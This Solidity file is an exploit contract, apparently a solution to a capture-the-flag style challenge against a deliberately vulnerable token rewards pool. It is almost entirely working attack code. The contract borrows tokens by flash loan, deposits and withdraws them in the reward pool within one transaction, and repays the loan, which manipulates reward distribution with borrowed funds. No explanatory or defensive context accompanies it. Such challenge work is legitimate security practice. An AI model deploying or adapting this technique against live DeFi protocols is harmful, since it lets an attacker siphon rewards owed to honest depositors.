// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface FlashLoaner {
    function flashLoan(uint256 amount) external;
}

interface RewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface DVTToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address to, uint256 amount) external returns (bool);
}

contract RewardPoolExploiter {
    
    DVTToken public immutable liquidityToken;
    FlashLoaner flashLoaner;
    RewarderPool rewarderPool;
    constructor(address _rewardPool, address _flashLoaner, address dvtAddress) {
        flashLoaner = FlashLoaner(_flashLoaner);
        rewarderPool = RewarderPool(_rewardPool);
        liquidityToken = DVTToken(dvtAddress);
    }


    function attack(uint256 flashLoanAmount) external {
        flashLoaner.flashLoan(flashLoanAmount);
    }

    function receiveFlashLoan(uint256 amount) public {

        liquidityToken.approve(address(rewarderPool), amount);
        // 2 - Deposit in reward pool
        rewarderPool.deposit(amount);

        // 3 - withdraw funds from reward pool
        rewarderPool.withdraw(amount);

        // 4 - Pay back loan
        liquidityToken.transfer(address(flashLoaner), amount);
    }
}